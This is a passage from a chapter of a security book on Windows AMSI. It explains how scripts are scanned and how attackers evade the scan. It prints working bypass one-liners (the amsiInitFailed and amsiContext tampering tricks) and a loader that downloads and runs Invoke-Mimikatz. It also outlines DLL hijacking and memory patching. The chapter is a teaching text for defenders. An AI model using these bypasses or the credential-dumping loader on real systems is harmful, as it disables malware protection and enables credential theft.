<html><head></head><body>
		<div id="_idContainer271">
			<h1 class="chapter-number" id="_idParaDest-309"><a id="_idTextAnchor324"/>12</h1>
			<h1 id="_idParaDest-310"><a id="_idTextAnchor325"/>Exploring the Antimalware Scan Interface (AMSI)</h1>
			<p>In the past, attackers often used scripts or executables to have their malware run on client systems. But antivirus products got better and better over the years, which meant that file-based malware could be more easily identified <span class="No-Break">and removed.</span></p>
			<p>For malware authors, this was a serious problem that they tried to circumvent, and so they came up with the solution to run their malicious code directly in memory, without touching the hard disk. So, specifically, built-in programs such as PowerShell, VBScript, JavaScript, and other tools are being used to run their malware attacks. Attackers became creative and obfuscated their code so that it’s not obviously identified <span class="No-Break">as malware.</span></p>
			<p>Microsoft came up with a solution to inspect the code before running it, called the <strong class="bold">Antimalware Scan Interface</strong> (<strong class="bold">AMSI</strong>). AMSI has developed accordingly and can even protect against the <a id="_idIndexMarker1991"/>most obfuscated attacks. However, it’s a constant cat-and-mouse game between attackers <span class="No-Break">and defenders.</span></p>
			<p>In this chapter, we will learn how AMSI works, and how attackers are trying to bypass it. We will cover the <span class="No-Break">following topics:</span></p>
			<ul>
				<li>What is AMSI and how does <span class="No-Break">it work?</span></li>
				<li>Why AMSI? A <span class="No-Break">practical example</span></li>
				<li>Bypassing AMSI: PowerShell downgrade attacks, configuration tampering, memory patching, hooking, and Dynamic Link <span class="No-Break">Library hijacking</span></li>
				<li>Obfuscation and <span class="No-Break">Base64 encoding</span></li>
			</ul>
			<h1 id="_idParaDest-311"><a id="_idTextAnchor326"/>Technical requirements</h1>
			<p>To make the most of this chapter, ensure that you have <span class="No-Break">the following:</span></p>
			<ul>
				<li>PowerShell 7.3 <span class="No-Break">and above</span></li>
				<li>Visual Studio <span class="No-Break">Code installed</span></li>
				<li><span class="No-Break">Ghidra installed</span></li>
				<li>Some basic knowledge of assembly code <span class="No-Break">and debuggers</span></li>
				<li>Access to the GitHub repository for <span class="No-Break">this chapter:</span></li>
			</ul>
			<p><a href="https://github.com/PacktPublishing/PowerShell-Automation-and-Scripting-for-Cybersecurity/tree/master/Chapter12"><span class="No-Break">https://github.com/PacktPublishing/PowerShell-Automation-and-Scripting-for-Cybersecurity/tree/master/Chapter12</span></a></p>
			<h1 id="_idParaDest-312"><a id="_idTextAnchor327"/>What is AMSI and how does it work?</h1>
			<p>AMSI is an interface that was designed to help with malware defense. Not only PowerShell but <a id="_idIndexMarker1992"/>also other languages such as JavaScript and VBScript can profit from it. It also gives third-party and self-written applications the option to protect their users from dynamic malware. It was introduced with Windows 10/Windows <span class="No-Break">Server 2016.</span></p>
			<p>Currently, AMSI is supported for the <span class="No-Break">following products:</span></p>
			<ul>
				<li><span class="No-Break">PowerShell</span></li>
				<li>Office Visual Basic for <span class="No-Break">Applications </span><span class="No-Break">macros</span></li>
				<li><span class="No-Break">VBScript</span></li>
				<li>Excel 4.0 (<span class="No-Break">XLM) macros</span></li>
				<li>Windows <span class="No-Break">Management Instrumentation</span></li>
				<li>Dynamically loaded .<span class="No-Break">NET assemblies</span></li>
				<li><span class="No-Break">JScript</span></li>
				<li><span class="No-Break">MSHTA/JScript9</span></li>
				<li>User <span class="No-Break">Account Control</span></li>
				<li>Windows Script Host (<strong class="source-inline">wscript.exe</strong> <span class="No-Break">and </span><span class="No-Break"><strong class="source-inline">cscript.exe</strong></span><span class="No-Break">)</span></li>
				<li>Third-party products that <span class="No-Break">support AMSI</span></li>
			</ul>
			<p>Like other APIs, AMSI provides an interface to the Win32 API and the COM API. AMSI is an open standard so it is not limited to PowerShell only; any developer can develop their application accordingly to support AMSI, and any registered antimalware engine can process the <a id="_idIndexMarker1993"/>contents provided through AMSI, as depicted in the following figure of the <span class="No-Break">AMSI architecture:</span></p>
			<div>
				<div class="IMG---Figure" id="_idContainer255">
					<img alt="Figure 12.1 – AMSI architecture" src="image/B16679_12_001.jpg"/>
				</div>
			</div>
			<p class="IMG---Caption" lang="en-US" xml:lang="en-US">Figure 12.1 – AMSI architecture</p>
			<p>In this chapter, I will only write about what happens when AMSI is initiated through PowerShell, but be aware that it works similarly for all other products <span class="No-Break">listed before.</span></p>
			<p>When a PowerShell process is created, <strong class="source-inline">amsi.dll</strong> is loaded into its process memory space. Now, whenever the execution of a script is attempted or a command is about to be run, it is first sent through <strong class="source-inline">amsi.dll</strong>. Within <strong class="source-inline">amsi.dll</strong>, the <strong class="source-inline">AmsiScanBuffer()</strong> and <strong class="source-inline">AmsiScanString()</strong> functions are responsible for ensuring that all commands or scripts that are about to be run will be first scanned for malicious content by the locally installed antivirus solution before anything is executed <span class="No-Break">at all:</span></p>
			<div>
				<div class="IMG---Figure" id="_idContainer256">
					<img alt="Figure 12.2 – AMSI functionality" src="image/B16679_12_002.jpg"/>
				</div>
			</div>
			<p class="IMG---Caption" lang="en-US" xml:lang="en-US">Figure 12.2 – AMSI functionality</p>
			<p><strong class="source-inline">Amsi.dll</strong> then logs the behavior for the code and checks with the current antivirus whether any signature <a id="_idIndexMarker1994"/>was created that matches this behavior. By default, Windows Defender is configured, but AMSI also provides an interface for other third-party antimalware programs to <span class="No-Break">interact with.</span></p>
			<p>If a signature matches, the code is blocked from execution. If everything seems to be fine, the code <span class="No-Break">is executed.</span></p>
			<h1 id="_idParaDest-313"><a id="_idTextAnchor328"/>Why AMSI? A practical example</h1>
			<p>Before we dive deeper into what exactly AMSI is, let’s first look at the <em class="italic">why</em>. As I mentioned in the <a id="_idIndexMarker1995"/>introduction of this chapter, it’s an ongoing battle between attackers and defenders. Attackers try to launch successful attacks, while defenders try to <span class="No-Break">prevent them.</span></p>
			<p>In the early days, it was quite easy for attackers. Often, they just had to write a script to perform their malicious actions, but soon, defenders reacted to that so that their malicious intentions were detected and blocked. Attackers had to obfuscate their actions to launch <span class="No-Break">successful attacks.</span></p>
			<p>In order to analyze the content, antimalware vendors can create their own in-process COM server (DLL) that serves as an AMSI provider and register it under the following <span class="No-Break">registry paths:</span></p>
			<ul>
				<li><span class="No-Break"><strong class="source-inline">HKLM\SOFTWARE\Microsoft\AMSI\Providers</strong></span></li>
				<li><span class="No-Break"><strong class="source-inline">HKLM\SOFTWARE\Classes\CLSID</strong></span></li>
			</ul>
			<p>A vendor can register one or more AMSI <span class="No-Break">provider DLLs.</span></p>
			<p>When an application (such as PowerShell) submits content to AMSI for scanning, the vendor’s AMSI provider DLL receives and analyzes the content. The provider DLL analyzes the content and returns a decision to the original application with an <strong class="source-inline">AMSI_RESULT</strong> enum value, which indicates whether the code is considered malicious <span class="No-Break">or not.</span></p>
			<p>If the result is <strong class="source-inline">AMSI_RESULT_DETECTED</strong> and no preventative action has been taken, it is up to the submitting application to decide how to handle the identified <span class="No-Break">malicious content.</span></p>
			<p>To detect malicious scripts and activities, antimalware solutions usually utilize signatures, which need to be updated frequently to stay ahead of <span class="No-Break">new threats.</span></p>
			<p>PowerShell scripts are essentially text files, which means that they must be string parsed to identify malicious behavior. When scripts are obfuscated, it becomes even more difficult to detect malicious code. Obfuscation techniques can vary widely and often require an unpacker to examine the inner workings of software to identify any malicious behavior or code to run for each type of obfuscation that <span class="No-Break">could occur.</span></p>
			<p>While hash smashing, changing variables or parameters, and adding layers of obfuscation are trivial for adversaries, for defenders, it is hard to detect malicious activities by <span class="No-Break">using signatures.</span></p>
			<p>In other forms of code (such as byte code or intermediate languages), the instructions compile down to a <a id="_idIndexMarker1996"/>limited set of instructions, making it easier to emulate APIs. With scripts, however, the situation is different, and this makes signature writing even <span class="No-Break">more difficult.</span></p>
			<p>In the following section, we will look at six examples that will help you understand why and how a solution such as AMSI can help extend the functionality of a regular antimalware engine, and what the challenges in script writing are for defenders that try to stay ahead of malware authors. Don’t take every example as a single standalone example, but rather, read it as a story. I have numbered the examples to make them easier to follow. You <a id="_idIndexMarker1997"/>can also find the code (as well as the code for the encoding) in this chapter’s GitHub <span class="No-Break">repository: </span><a href="https://github.com/PacktPublishing/PowerShell-Automation-and-Scripting-for-Cybersecurity/blob/master/Chapter12/Examples_whyAMSI.ps1"><span class="No-Break">https://github.com/PacktPublishing/PowerShell-Automation-and-Scripting-for-Cybersecurity/blob/master/Chapter12/Examples_whyAMSI.ps1</span></a><span class="No-Break">.</span></p>
			<h2 id="_idParaDest-314"><a id="_idTextAnchor329"/>Example 1</h2>
			<p>Let’s look <a id="_idIndexMarker1998"/>at a script that should represent malicious code. In this case, it’s harmless, as it only writes <strong class="source-inline">Y0u g0t h4ck3d!</strong> to the command line, as <span class="No-Break">shown here:</span></p>
			<pre class="source-code">
function Invoke-MaliciousScript {
    Write-Host "Y0u g0t h4ck3d!"
}
Invoke-MaliciousScript</pre>
			<p>A defender could now write a very simple detection signature, looking for the <strong class="source-inline">Write-Host "Y0u g0t h4ck3d!"</strong> string to stop the execution of <span class="No-Break">this script.</span></p>
			<h2 id="_idParaDest-315"><a id="_idTextAnchor330"/>Example 2</h2>
			<p>Suppose attackers need to come up with a new way to execute their scripts successfully. So, they may start breaking the string into pieces and work with variables, as well as <span class="No-Break">with concatenation:</span></p>
			<pre class="source-code">
function Invoke-MaliciousScript {
    $a = 4
    $output = "Y0" + "u g" + "0t h" + $a + "ck" + ($a - 1) + "d!"
    Write-Host $output
}
Invoke-MaliciousScript</pre>
			<p>The old signature just searching for the string would not match anymore. In response, defenders would start building a simple language emulation. For example, if it is spotted that a string is concatenated out of multiple substrings, the new algorithm would emulate the concatenation and check it against any <span class="No-Break">malicious patterns.</span></p>
			<h2 id="_idParaDest-316"><a id="_idTextAnchor331"/>Example 3</h2>
			<p>At this point, attackers would try to move to something more complicated – for example, by encoding their payload using Base64 and decoding it when running the script, as in the following example. The <strong class="source-inline">"WQAwAHUAIABnADAAdAAgAGgANABjAGsAMwBkACEA"</strong> string represents the Base64 encoded version of our former string, <strong class="source-inline">"Y0u </strong><span class="No-Break"><strong class="source-inline">g0t h4ck3d!"</strong></span><span class="No-Break">:</span></p>
			<pre class="source-code">
function Invoke-MaliciousScript {
    $string = "WQAwAHUAIABnADAAdAAgAGgANABjAGsAMwBkACEA"
    $output = [System.Text.Encoding]::Unicode.GetString([System.Convert]::FromBase64String($string))
    Write-Host $output
}
Invoke-MaliciousScript</pre>
			<p>But most antimalware <a id="_idIndexMarker1999"/>programs thankfully already have some kind of Base64 decoding emulation implemented, so this <a id="_idIndexMarker2000"/>example would still be caught by most <strong class="bold">antivirus</strong> (<span class="No-Break"><strong class="bold">AV</strong></span><span class="No-Break">) engines.</span></p>
			<p>As a result, attackers would try to think of a more difficult way to make detection even harder – for example, using <span class="No-Break">algorithmic obfuscation.</span></p>
			<h2 id="_idParaDest-317"><a id="_idTextAnchor332"/>Example 4</h2>
			<p>For the following example, I have encoded our <strong class="source-inline">"Y0u g0t h4ck3d!"</strong> attack string with a simple XOR algorithm, resulting in the <strong class="source-inline">"SyJnMnUiZjJ6JnF5IXYz"</strong> encoded string. Using the following function, we convert the string back into the original pattern, using the <strong class="source-inline">XOR</strong> <span class="No-Break">key, </span><span class="No-Break"><strong class="source-inline">0x12</strong></span><span class="No-Break">:</span></p>
			<pre class="source-code">
function Invoke-MaliciousScript {
    $string = "SyJnMnUiZjJ6JnF5IXYz"
    $key = 0x12
    $bytes = [System.Convert]::FromBase64String($string)
    $output = -join ($bytes | ForEach-Object { [char] ($_ -bxor $key)})
    Write-Host $output
}
Invoke-MaliciousScript</pre>
			<p>Now, this example is way more advanced than anything that a normal antimalware engine could emulate. So, without any further mechanism (such as AMSI), we won’t be able to detect what this script is doing. Of course, defenders could write signatures to detect <span class="No-Break">obfuscated scripts.</span></p>
			<h2 id="_idParaDest-318"><a id="_idTextAnchor333"/>Example 5</h2>
			<p>But what if the script just looks like a normal and well-behaved script but, in the end, it downloads the malicious content from the web and executes it locally, as in the following example? How <a id="_idIndexMarker2001"/>would you write a signature for it if you were responsible for writing detections for the <span class="No-Break">following example?</span></p>
			<pre class="source-code">
function Invoke-MaliciousScript {
    $output = Invoke-WebRequest https://raw.githubusercontent.com/PacktPublishing/PowerShell-Automation-and-Scripting-for-Cybersecurity/master/Chapter12/AMSIExample5.txt
    Invoke-Expression $output
}
Invoke-MaliciousScript</pre>
			<p>If this code is run, you still get the output <strong class="source-inline">"Y0u g0t h4ck3d!"</strong>, which we initiated through the script that is uploaded on <span class="No-Break">GitHub: </span><a href="https://github.com/PacktPublishing/PowerShell-Automation-and-Scripting-for-Cybersecurity/blob/master/Chapter12/AMSIExample5.txt"><span class="No-Break">https://github.com/PacktPublishing/PowerShell-Automation-and-Scripting-for-Cybersecurity/blob/master/Chapter12/AMSIExample5.txt</span></a><span class="No-Break">.</span></p>
			<p>Now we are at a point where it is almost impossible to write a signature to detect this malicious behavior without generating too many false positives. False positives just cause too much work for analysts, and if too many false positives occur, real threats might be missed. So, this is a problem. But this is exactly where AMSI comes in <span class="No-Break">to help.</span></p>
			<h2 id="_idParaDest-319"><a id="_idTextAnchor334"/>Example 6</h2>
			<p>Now, with AMSI enabled, let’s look at the behavior when we repeat the last example, but this time, with a file that would trigger AMSI: <a href="https://github.com/PacktPublishing/PowerShell-Automation-and-Scripting-for-Cybersecurity/blob/master/Chapter12/AMSIExample6.txt">https://github.com/PacktPublishing/PowerShell-Automation-and-Scripting-for-Cybersecurity/blob/master/Chapter12/AMSIExample6.txt</a>. Don’t worry, for this example, we are also not using real malicious code – we are using an example that generates the AMSI test sample string, <strong class="source-inline">'AMSI Test </strong><span class="No-Break"><strong class="source-inline">Sample: 7e72c3ce-861b-4339-8740-0ac1484c1386'</strong></span><span class="No-Break">:</span></p>
			<div>
				<div class="IMG---Figure" id="_idContainer257">
					<img alt="Figure 12.3 – The file that generates an AMSI test sample string" src="image/B16679_12_003.jpg"/>
				</div>
			</div>
			<p class="IMG---Caption" lang="en-US" xml:lang="en-US">Figure 12.3 – The file that generates an AMSI test sample string</p>
			<p>If we now run a <a id="_idIndexMarker2002"/>malicious command from the command line or from a script, you see that AMSI interferes and blocks the command before it gets executed: <strong class="source-inline">Invoke-Expression (</strong><span class="No-Break"><strong class="source-inline">Invoke-WebRequest </strong></span><span class="No-Break">https://github.com/PacktPublishing/PowerShell-Automation-and-Scripting-for-Cybersecurity/blob/master/Chapter12/AMSIExample6.txt</span><span class="No-Break"><strong class="source-inline">)</strong></span><span class="No-Break">:</span></p>
			<div>
				<div class="IMG---Figure" id="_idContainer258">
					<img alt="Figure 12.4 – AMSI in action" src="image/B16679_12_004.jpg"/>
				</div>
			</div>
			<p class="IMG---Caption" lang="en-US" xml:lang="en-US">Figure 12.4 – AMSI in action</p>
			<p>AMSI blocks the execution and, depending on which antimalware engine you are using, you can see that an event <a id="_idIndexMarker2003"/>was generated. If you are using the default Defender engine, you can find all AMSI-related event logs in the <strong class="source-inline">Defender/Operational</strong> log under the event ID <strong class="source-inline">1116</strong>, as shown in the <span class="No-Break">following screenshot:</span></p>
			<div>
				<div class="IMG---Figure" id="_idContainer259">
					<img alt="Figure 12.5 – AMSI-related events show up in the Defender/Operational event log if the default Defender engine is used" src="image/B16679_12_005.jpg"/>
				</div>
			</div>
			<p class="IMG---Caption" lang="en-US" xml:lang="en-US">Figure 12.5 – AMSI-related events show up in the Defender/Operational event log if the default Defender engine is used</p>
			<p>Now that you have understood how AMSI works, why it is needed, and how it can help, let’s look deeper into how adversaries are trying to <span class="No-Break">bypass AMSI.</span></p>
			<h1 id="_idParaDest-320"><a id="_idTextAnchor335"/>Bypassing AMSI</h1>
			<p>AMSI is really helpful <a id="_idIndexMarker2004"/>for defenders when it comes to preventing malicious code from getting executed. But attackers would not be attackers if they did not try to find a way to bypass AMSI. In this section, we will look at some <span class="No-Break">common techniques.</span></p>
			<p>Most bypasses I have come across are somehow trying to tamper with <strong class="source-inline">amsi.dll</strong>. Most of the time, the goal is to either manipulate the result so that malicious code appears clean by replacing <strong class="source-inline">amsi.dll</strong> with a custom one or by avoiding <span class="No-Break"><strong class="source-inline">amsi.dll</strong></span><span class="No-Break"> completely.</span></p>
			<p>Often, when there’s a new bypass found that people blog about, it gets immediately fixed and detected shortly after it <span class="No-Break">is released.</span></p>
			<p>Joseph Bialek originally wrote the <strong class="source-inline">Invoke-Mimikatz.ps1</strong> script to make all Mimikatz functions available <span class="No-Break">via PowerShell.</span></p>
			<p><strong class="source-inline">Invoke-Mimikatz</strong> is a part of the <strong class="source-inline">nishang</strong> module and can be downloaded from <span class="No-Break">GitHub: </span><a href="https://raw.githubusercontent.com/samratashok/nishang/master/Gather/Invoke-Mimikatz.ps1"><span class="No-Break">https://raw.githubusercontent.com/samratashok/nishang/master/Gather/Invoke-Mimikatz.ps1</span></a><span class="No-Break">.</span></p>
			<p>To demonstrate the examples here, I have created a little module that loads the <strong class="source-inline">Invoke-Mimikatz.ps1</strong> script. Just copy <a id="_idIndexMarker2005"/>and paste the raw code if you want to reproduce it in your <span class="No-Break">demo environment:</span></p>
			<pre class="source-code">
New-Module -Name Invoke-MimikatzModule -ScriptBlock {
    Invoke-Expression (Invoke-WebRequest -UseBasicParsing "https://raw.githubusercontent.com/samratashok/nishang/master/Gather/Invoke-Mimikatz.ps1")
    Export-ModuleMember -function Invoke-Mimikatz
} | Import-Module</pre>
			<p>You can also find the little code snippet in this chapter’s GitHub <span class="No-Break">repository: </span><a href="https://github.com/PacktPublishing/PowerShell-Automation-and-Scripting-for-Cybersecurity/blob/master/Chapter12/Demo_loadMimikatz.ps1"><span class="No-Break">https://github.com/PacktPublishing/PowerShell-Automation-and-Scripting-for-Cybersecurity/blob/master/Chapter12/Demo_loadMimikatz.ps1</span></a><span class="No-Break">.</span></p>
			<p class="callout-heading">Disclaimer</p>
			<p class="callout">Please make sure that this code is only run in your demo environment and not on your <span class="No-Break">production machine.</span></p>
			<p>I’m using Windows PowerShell for these examples instead of PowerShell Core as this would usually be the attacker’s choice. Running Mimikatz from PowerShell Core would also cause errors while using the current <span class="No-Break"><strong class="source-inline">Invoke-Mimikatz.ps1</strong></span><span class="No-Break"> version.</span></p>
			<p>For the following demos, <strong class="bold">Windows Defender real-time protection</strong> was temporarily disabled to run the code <a id="_idIndexMarker2006"/>and load Mimikatz into memory. If everything worked, you will now see the typical Mimikatz output while running <strong class="source-inline">Invoke-Mimikatz</strong>, as shown in the <span class="No-Break">following screenshot:</span></p>
			<div>
				<div class="IMG---Figure" id="_idContainer260">
					<img alt="Figure 12.6 – Running Mimikatz from memory" src="image/B16679_12_006.jpg"/>
				</div>
			</div>
			<p class="IMG---Caption" lang="en-US" xml:lang="en-US">Figure 12.6 – Running Mimikatz from memory</p>
			<p>After Mimikatz was loaded, Windows Defender real-time protection was enabled again. This way, it is easier to <a id="_idIndexMarker2007"/>demonstrate the impact of AMSI in the <span class="No-Break">following examples.</span></p>
			<p>Now, if real-time protection was enabled successfully, you will see the following output while <span class="No-Break">running Mimikatz:</span></p>
			<div>
				<div class="IMG---Figure" id="_idContainer261">
					<img alt="Figure 12.7 – Mimikatz is blocked by AMSI" src="image/B16679_12_007.jpg"/>
				</div>
			</div>
			<p class="IMG---Caption" lang="en-US" xml:lang="en-US">Figure 12.7 – Mimikatz is blocked by AMSI</p>
			<p>This output <a id="_idIndexMarker2008"/>simply means that AMSI is in place to protect this machine and has blocked the <strong class="source-inline">Invoke-Mimikatz</strong> command from <span class="No-Break">being executed.</span></p>
			<p>Okay, now we are ready to start with our <span class="No-Break">demo examples.</span></p>
			<h2 id="_idParaDest-321"><a id="_idTextAnchor336"/>Preventing files from being detected or disabling AMSI temporarily</h2>
			<p>Most attack attempts try to prevent the malware from being scanned by tampering with the <span class="No-Break">AMSI library.</span></p>
			<h3>PowerShell downgrade attack</h3>
			<p>One of the easiest ways to avoid AMSI is to downgrade the PowerShell version to a former version <a id="_idIndexMarker2009"/>that did not support AMSI. You can find a <a id="_idIndexMarker2010"/>detailed explanation of a downgrading attack in <a href="B16679_04_Final_PD.xhtml#_idTextAnchor090"><span class="No-Break"><em class="italic">Chapter 4</em></span></a>, <em class="italic">Detection – Auditing and Monitoring</em>, so it won’t be described <span class="No-Break">here further.</span></p>
			<p>When trying to run <strong class="source-inline">Invoke-Mimikatz</strong> from a normal PowerShell console, AMSI kicks in and blocks the execution of <span class="No-Break">the command.</span></p>
			<p>But if PowerShell version 2 is available on a machine, an attacker would be able to run the following commands to avoid AMSI via a <span class="No-Break">downgrade attack:</span></p>
			<div>
				<div class="IMG---Figure" id="_idContainer262">
					<img alt="Figure 12.8 – Invoke-Mimikatz can be executed without AMSI interfering" src="image/B16679_12_008.jpg"/>
				</div>
			</div>
			<p class="IMG---Caption" lang="en-US" xml:lang="en-US">Figure 12.8 – Invoke-Mimikatz can be executed without AMSI interfering</p>
			<p>But if the system is hardened appropriately, downgrade attacks should not <span class="No-Break">be possible.</span></p>
			<h3>Configuration tampering</h3>
			<p>One very <a id="_idIndexMarker2011"/>popular example of changing the AMSI configuration is the bypass from Matt Graeber, which he tweeted about <span class="No-Break">in 2016:</span></p>
			<div>
				<div class="IMG---Figure" id="_idContainer263">
					<img alt="Figure 12.9 – Matt Graeber’s AMSI bypass in 2016" src="image/B16679_12_009.jpg"/>
				</div>
			</div>
			<p class="IMG---Caption" lang="en-US" xml:lang="en-US">Figure 12.9 – Matt Graeber’s AMSI bypass in 2016</p>
			<p>Matt managed to disable AMSI by just using <span class="No-Break">a one-liner:</span></p>
			<pre class="source-code">
[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)</pre>
			<p>This bypass would just set the <strong class="source-inline">amsiInitFailed</strong> Boolean to <strong class="source-inline">$true</strong>. This simulated the AMSI initialization failing, so that no scans could be performed and so that future AMSI scans would <span class="No-Break">be disabled.</span></p>
			<p>In the meantime, the industry was able to write detections to block this particular bypass, but it is still a great example to show one method of disabling and circumventing AMSI. Remember, if those detections were not in place, the bypass itself would still pass <span class="No-Break">through AMSI.</span></p>
			<p>The output shows the one-liner code blocked <span class="No-Break">by AMSI:</span></p>
			<div>
				<div class="IMG---Figure" id="_idContainer264">
					<img alt="Figure 12.10 – AMSI blocks the one-liner" src="image/B16679_12_010.jpg"/>
				</div>
			</div>
			<p class="IMG---Caption" lang="en-US" xml:lang="en-US">Figure 12.10 – AMSI blocks the one-liner</p>
			<p>Of course, this method can still work if the command is only obfuscated enough. A lot of substrings used here are also considered malicious and <span class="No-Break">therefore detected.</span></p>
			<p>A lot of signatures were added for certain trigger words, such as <strong class="source-inline">amsiInitFailed</strong>. Other researchers have also attempted to find a bypass, inspired by Matt Graeber’s one-liner. One of those bypasses was discovered by Adam Chester <span class="No-Break">in 2018:</span></p>
			<pre class="source-code">
$mem = [System.Runtime.InteropServices.Marshal]::AllocHGlobal(9076)
[Ref].Assembly.GetType("System.Management.Automation.AmsiUtils").GetField("amsiContext","NonPublic,Static").SetValue($null, [IntPtr]$mem)
[Ref].Assembly.GetType("System.Management.Automation.AmsiUtils").GetField("amsiSession","NonPublic,Static").SetValue($null, $null);</pre>
			<p>As the former bypass to set <strong class="source-inline">amsiInitFailed</strong> to <strong class="source-inline">$true</strong> is already very well known by attackers and <a id="_idIndexMarker2012"/>defenders, most attempts to interact with this flag are highly suspicious and, therefore, will be detected. But if we can enforce an error without querying suspicious flags, it would basically have the same effect. And this is exactly what Adam’s bypass is <span class="No-Break">doing here.</span></p>
			<p>He forces an error by tampering with <strong class="source-inline">amsiContext</strong> and <strong class="source-inline">amsiSession</strong>. AMSI initialization will fail and future scans within this session <span class="No-Break">won’t happen.</span></p>
			<p>You can read how Adam discovered this bypass and other interesting approaches in this blog <span class="No-Break">article: </span><a href="https://www.mdsec.co.uk/2018/06/exploring-powershell-amsi-and-logging-evasion/"><span class="No-Break">https://www.mdsec.co.uk/2018/06/exploring-powershell-amsi-and-logging-evasion/</span></a><span class="No-Break">.</span></p>
			<p>Of course, in the meantime, there were new signatures added for this particular bypass, so it does not work any longer <span class="No-Break">without obfuscation.</span></p>
			<h3>DLL hijacking</h3>
			<p>Another method to avoid <a id="_idIndexMarker2013"/>code being scanned by AMSI is <strong class="bold">DLL hijacking</strong>. Within <a id="_idIndexMarker2014"/>this <span class="No-Break">attack, </span><span class="No-Break"><strong class="source-inline">amsi.dll</strong></span><strong class="source-inline">
</strong> is basically replaced with another modified version that does not interfere with the (malicious) code that is attempted to <span class="No-Break">be executed.</span></p>
			<p>It’s worth noting that if attackers are able to remove or replace DLLs on a system and execute arbitrary code, running PowerShell is probably one of your least concerns. </p>
			<p>In 2016, Cornelis de Plaa discovered an AMSI bypass using DLL hijacking. He created an empty <strong class="source-inline">amsi.dll</strong> file in a folder and copied <strong class="source-inline">powershell.exe</strong> in the same directory. Once the copied PowerShell was started, the original <strong class="source-inline">amsi.dll</strong> file was not loaded, but the <strong class="source-inline">amsi.dll</strong> fake file was loaded into memory, which did not, of course, check the <span class="No-Break">executed code.</span></p>
			<p>After this bug was reported to Microsoft MSRC on March 28, 2016, they implemented a fix, which caused PowerShell not to work properly anymore once executed with an empty <strong class="source-inline">amsi.dll</strong> <span class="No-Break">file loaded.</span></p>
			<div>
				<div class="IMG---Figure" id="_idContainer265">
					<img alt="Figure 12.11 – Broken PowerShell pipeline after loading powershell.exe with an empty amsi.dll" src="image/B16679_12_011.jpg"/>
				</div>
			</div>
			<p class="IMG---Caption" lang="en-US" xml:lang="en-US">Figure 12.11 – Broken PowerShell pipeline after loading powershell.exe with an empty amsi.dll</p>
			<p>In June 2020, Philippe Vogler found a way to revive this old AMSI bypass. He created an <strong class="source-inline">amsi.dll</strong> file that could at least call all functions a normal <strong class="source-inline">amsi.dll</strong> file would contain, but those functions were just plain dummy functions, so no check would be performed. With this file, he managed to bypass AMSI using DLL hijacking <span class="No-Break">once more.</span></p>
			<p>You can find more information on his <span class="No-Break">blog: </span><a href="https://sensepost.com/blog/2020/resurrecting-an-old-amsi-bypass/"><span class="No-Break">https://sensepost.com/blog/2020/resurrecting-an-old-amsi-bypass/</span></a><span class="No-Break">.</span></p>
			<p>Also make <a id="_idIndexMarker2015"/>sure to check out Cornelis de Plaa’s blog to find out how <a id="_idIndexMarker2016"/>he discovered the original AMSI DLL hijacking <span class="No-Break">bypass: </span><a href="http://cn33liz.blogspot.com/2016/05/bypassing-amsi-using-powershell-5-dll.html"><span class="No-Break">http://cn33liz.blogspot.com/2016/05/bypassing-amsi-using-powershell-5-dll.html</span></a><span class="No-Break">.</span></p>
			<h3>Memory patching</h3>
			<p>Memory patching is a technique used by red teamers to modify a program in memory without changing its <a id="_idIndexMarker2017"/>executables or file stamps. When it comes <a id="_idIndexMarker2018"/>to memory patching to avoid AMSI, usually, attackers try to modify memory calls, so that <strong class="source-inline">amsi.dll</strong> is not executed correctly and that the check routine would <span class="No-Break">be skipped.</span></p>
			<p>Let’s have a look first at what it looks like from a memory perspective. To do so, let’s open <strong class="source-inline">amsi.dll</strong> in the debug tool of your choice. In this example, I will use the open source <span class="No-Break">tool, Ghidra.</span></p>
			<p>As a first step, import <strong class="source-inline">amsi.dll</strong> into Ghidra, then open it within a project. Usually, <strong class="source-inline">amsi.dll</strong> is located <span class="No-Break">under </span><span class="No-Break"><strong class="source-inline">C:\Windows\System32\amsi.dll</strong></span><span class="No-Break">.</span></p>
			<p>We can see all functions that are available within <strong class="source-inline">amsi.dll</strong> – for our experiment. The <strong class="source-inline">AmsiScanBuffer</strong> and <strong class="source-inline">AmsiScanString</strong> functions are of <span class="No-Break">special interest.</span></p>
			<div>
				<div class="IMG---Figure" id="_idContainer266">
					<img alt="Figure 12.12 – Functions within amsi.dll" src="image/B16679_12_012.jpg"/>
				</div>
			</div>
			<p class="IMG---Caption" lang="en-US" xml:lang="en-US">Figure 12.12 – Functions within amsi.dll</p>
			<p>Ghidra offers an amazing function to decompile code. So, if we first look at the <strong class="source-inline">AmsiScanString</strong> function, we can quickly spot that this function also calls the <strong class="source-inline">AmsiScanBuffer</strong> function. So, <strong class="source-inline">AmsiScanBuffer</strong> might be the most attractive target as it seems as if <a id="_idIndexMarker2019"/>changing the memory for this function <a id="_idIndexMarker2020"/>covers both use cases: <strong class="source-inline">AmsiScanBuffer</strong> <span class="No-Break">and </span><span class="No-Break"><strong class="source-inline">AmsiScanString</strong></span><span class="No-Break">.</span></p>
			<div>
				<div class="IMG---Figure" id="_idContainer267">
					<img alt="Figure 12.13 – Decompiled AmsiScanString function" src="image/B16679_12_013.jpg"/>
				</div>
			</div>
			<p class="IMG---Caption" lang="en-US" xml:lang="en-US">Figure 12.13 – Decompiled AmsiScanString function</p>
			<p>So, what we basically need to do is first find out the start address of the <strong class="source-inline">AmsiScanBuffer</strong> function within the currently loaded <span class="No-Break"><strong class="source-inline">amsi.dll</strong></span><span class="No-Break"> file.</span></p>
			<p>Once we know this address, we can try to manipulate the memory, so that it does not jump into the actual <strong class="source-inline">AmsiScanBuffer</strong> function but skips it. When we operate on the memory/assembly level, there is one thing that we can use to achieve this. The <strong class="source-inline">RET</strong> instruction indicates the end of a subroutine and returns to the code that called it initially. So, if we overwrite the first bytes of the <strong class="source-inline">AmsiScanBuffer</strong> subroutine with the <strong class="source-inline">RET</strong> instruction, the function will be terminated without <span class="No-Break">scanning anything.</span></p>
			<p>Once we have achieved this, we can execute all PowerShell code that we like in the current session without having it checked. But, similarly, if an attacker is able to edit arbitrary memory in processes in your system, you likely have <span class="No-Break">bigger problems.</span></p>
			<p>Let’s see how we <a id="_idIndexMarker2021"/>can achieve this with PowerShell. The <strong class="source-inline">kernel32.dll</strong> file provides functions to access the memory using PowerShell – especially <a id="_idIndexMarker2022"/>the <strong class="source-inline">GetModuleHandle</strong>, <strong class="source-inline">GetProcAddress</strong>, and <strong class="source-inline">VirtualProtect</strong> functions. So, let’s import those functions into our current <span class="No-Break">PowerShell session:</span></p>
			<pre class="source-code">
